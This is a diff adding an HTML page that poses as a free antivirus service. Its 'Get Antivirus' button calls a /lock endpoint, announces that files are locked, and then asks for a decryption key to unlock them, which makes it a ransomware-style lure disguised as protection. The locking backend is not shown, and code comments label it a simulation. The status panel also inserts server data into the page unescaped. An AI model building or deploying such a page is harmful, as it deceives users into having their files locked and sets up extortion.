@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Top Secrets Exposed! Unlock Hidden Information</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(120deg, #ff6f61, #6a82fb);
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        h1, h2 {
+            margin: 0 0 20px;
+        }
+        .button {
+            display: inline-block;
+            padding: 15px 30px;
+            margin: 15px 0;
+            font-size: 16px;
+            font-weight: bold;
+            color: #fff;
+            text-transform: uppercase;
+            text-decoration: none;
+            border: none;
+            border-radius: 30px;
+            background: linear-gradient(90deg, #f39c12, #e74c3c, #8e44ad, #3498db);
+            background-size: 400% 400%;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            animation: gradientAnimation 4s infinite;
+        }
+        .button:hover {
+            transform: scale(1.1);
+        }
+        .button:active {
+            transform: scale(0.95);
+        }
+        input[type="text"] {
+            width: 80%;
+            padding: 10px;
+            margin: 15px 0;
+            border-radius: 10px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            text-align: center;
+        }
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .hidden-message, .hidden-content {
+            display: none;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 Top Secrets Exposed! 🔥</h1>
+        <h2>Press get antivirus secure your file</h2>
+        <p>This website has free antivirus which helps you to save the files</p>
+
+        <!-- Lock Simulation -->
+        <button class="button" id="simulateLock" onclick="simulateLock()">💥 Get Antivirus 💥</button>
+        <div class="hidden-message" id="lockMessage">🔒 Your files are being secured! Please wait... 🔒</div>
+
+        <!-- Hidden Content -->
+        <div class="hidden-content" id="hiddenContent">
+            <form action="/unlock" method="post" onsubmit="return unlockFiles(event)">
+                <input type="text" id="key" placeholder="Enter Your Exclusive Key" required>
+                <button class="button" type="submit">🔓 Unlock Secrets 🔓</button>
+            </form>
+
+            <button class="button" onclick="checkStatus()">📂 Check File Status 📂</button>
+            <div class="status" id="statusMessage"></div>
+        </div>
+    </div>
+
+    <script>
+        function simulateLock() {
+            const lockButton = document.getElementById("simulateLock");
+            const lockMessage = document.getElementById("lockMessage");
+            const hiddenContent = document.getElementById("hiddenContent");
+
+            // Show the lock message
+            lockMessage.style.display = "block";
+
+            // Simulate delay for visual effect
+            setTimeout(() => {
+                fetch("/lock", { method: "POST" })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert("💥 Files Locked Successfully! 💥");
+                        console.log(data);
+
+                        // Hide the lock button and message
+                        lockMessage.style.display = "none";
+                        lockButton.style.display = "none";
+
+                        // Show the hidden content
+                        hiddenContent.style.display = "block";
+                    })
+                    .catch(err => {
+                        alert("❌ Error: " + err);
+                        lockMessage.style.display = "none";
+                    });
+            }, 2000); // Simulate a delay of 2 seconds
+        }
+
+        function unlockFiles(event) {
+            event.preventDefault();
+            const key = document.getElementById("key").value;
+            fetch("/unlock", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ decryption_key: key }),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.message) {
+                        alert("🔓 Files Unlocked Successfully! 🔓");
+                        console.log(data);
+
+                        // Hide the hidden content and show the lock button
+                        document.getElementById("hiddenContent").style.display = "none";
+                        document.getElementById("simulateLock").style.display = "inline-block";
+                    } else {
+                        alert(data.error || "❌ Error Unlocking Files");
+                    }
+                })
+                .catch(err => alert("❌ Error: " + err));
+        }
+
+        function checkStatus() {
+            fetch("/status", { method: "GET" })
+                .then(response => response.json())
+                .then(data => {
+                    const statusMessage = document.getElementById("statusMessage");
+                    statusMessage.innerHTML = `
+                        <p>🔒 Locked Files: ${data.locked_files.join(", ") || "None"}</p>
+                        <p>🔓 Unlocked Files: ${data.unlocked_files.join(", ") || "None"}</p>
+                    `;
+                })
+                .catch(err => alert("❌ Error: " + err));
+        }
+    </script>
+</body>
+</html>
